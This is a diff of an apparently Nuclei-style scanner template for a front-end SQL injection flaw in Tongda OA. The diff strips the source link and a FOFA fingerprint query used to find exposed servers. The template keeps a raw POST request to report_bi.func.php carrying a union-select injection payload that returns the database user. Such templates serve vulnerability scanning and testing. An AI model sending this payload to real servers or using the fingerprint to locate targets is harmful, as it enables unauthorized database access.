@@ -3,12 +3,8 @@ info:
   name: 通达OA report_bi前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kmg3u3mcq79031z0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kmg3u3mcq79031z0
-    fofa: title="office Anywhere" && icon_hash="-759108386" && "2017"
 http:
 - raw:
   - 'POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     _POST[dataset_id]=efgh''-@`''`)union select 1,2,user()#''&action=get_link_info&
